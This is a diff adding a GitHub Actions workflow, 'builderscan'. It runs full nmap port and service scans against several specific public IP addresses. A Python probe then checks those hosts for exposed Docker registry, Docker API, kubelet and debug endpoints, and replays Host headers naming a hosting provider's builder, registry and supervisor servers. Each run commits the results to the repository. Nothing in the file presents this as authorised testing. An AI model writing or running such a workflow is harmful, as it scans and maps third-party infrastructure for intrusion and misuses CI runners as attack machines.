@@ -1,0 +1,75 @@
+name: builderscan
+on: [push, workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+      - name: install
+        run: |
+          sudo apt-get update -qq >/dev/null 2>&1 || true
+          sudo apt-get install -y -qq nmap curl netcat-openbsd >/dev/null 2>&1 || true
+          echo ok
+      - name: scan
+        run: |
+          mkdir -p results
+          for ip in 116.202.217.236 188.40.98.155 188.245.195.191; do
+            echo "===== FULLSCAN $ip =====" | tee -a results/scan.log
+            sudo nmap -sS -p- -T4 --min-rate 1500 -Pn -n $ip -oN results/full_$ip.nmap 2>&1 | tail -30 | tee -a results/scan.log
+          done
+          echo "===== TARGETED 116.202.6.71 =====" | tee -a results/scan.log
+          sudo nmap -sS -p 22,80,443,5000,5001,8080,8081,1234,2375,2376,3000,9090,10033,10250,22222,8443 -T4 -Pn -n 116.202.6.71 -oN results/t_116.202.6.71.nmap 2>&1 | tail -30 | tee -a results/scan.log
+          echo "===== SERVICE VERSION ON DISCOVERED PORTS =====" | tee -a results/scan.log
+          for ip in 116.202.217.236 188.40.98.155 188.245.195.191; do
+            PORTS=$(grep -oE '^[0-9]+/tcp +open' results/full_$ip.nmap | cut -d/ -f1 | paste -sd, -)
+            echo "OPEN $ip -> $PORTS" | tee -a results/scan.log
+            [ -n "$PORTS" ] && timeout 180 sudo nmap -sV -Pn -n -p $PORTS --version-intensity 5 $ip -oN results/sv_$ip.nmap 2>&1 | tail -40 | tee -a results/scan.log
+          done
+          echo SCANDONE | tee -a results/scan.log
+      - name: probe
+        run: |
+          mkdir -p results
+          cat > x.py <<'PY'
+          import subprocess,json
+          def run(c,timeout=12):
+              try:
+                  r=subprocess.run(c,shell=True,capture_output=True,text=True,timeout=timeout)
+                  return (r.stdout+r.stderr).strip()
+              except Exception as ex:
+                  return 'TIMEOUT '+repr(ex)
+          out=open('results/probe.log','w')
+          def log(x):
+              print(x); out.write(str(x)+'\n'); out.flush()
+          hosts=['116.202.217.236','188.40.98.155','188.245.195.191']
+          paths=['/','/v1/build','/build','/v2/','/v2/_catalog','/healthz','/health','/metrics','/debug/pprof/','/dockerfile','/context','/cache','/registry','/api','/grpc.health.v1.Health/Check']
+          for ip in hosts:
+              for p in [80,443,5000,5001,8080,8081,1234,2375,2376,3000,9090,22222]:
+                  for path in ['/','/v2/','/v2/_catalog','/health','/healthz']:
+                      u=f'http://{ip}:{p}{path}'
+                      o=run(f"curl -sS -m 6 -i --max-time 7 '{u}' | head -c 700")
+                      if 'Connection refused' in o or 'timed out' in o or 'TIMEOUT' in o or 'Empty reply' in o: continue
+                      log(f'HTTP {u} => {o!r}')
+                  u=f'https://{ip}:{p}/v2/'
+                  o=run(f"curl -skS -m 6 -i --max-time 7 '{u}' | head -c 700")
+                  if 'Connection refused' in o or 'timed out' in o or 'TIMEOUT' in o or 'Empty reply' in o or 'SSL' in o: 
+                      log(f'HTTPS {ip}:{p}/v2/ => {o[:180]!r}'); continue
+                  log(f'HTTPS {u} => {o!r}')
+          # host-header replay on 80/443 of builder ips
+          for ip in ['116.202.217.236','188.40.98.155']:
+              for h in ['builder-01.fsn1.ger.sliplane.io','builder-02.fsn1.ger.sliplane.io','registry-01.sliplane.io','argo.sliplane.io','supervisor.sliplane.io']:
+                  o=run(f"curl -sS -m 6 -i --max-time 7 -H 'Host: {h}' 'http://{ip}/' | head -c 500")
+                  log(f'H{ip} {h} => {o!r}')
+          out.close()
+          PY
+          python3 x.py 2>&1 | tail -200
+          ls -la results
+      - name: commit
+        if: always()
+        run: |
+          git config user.name probe; git config user.email probe@users.noreply.github.com
+          git add -A results || true
+          git commit -m "builderscan $(date -u +%s)" || true
+          for i in 1 2 3 4 5; do git pull --rebase origin main >/dev/null 2>&1 || true; git push && break; sleep 6; done || true
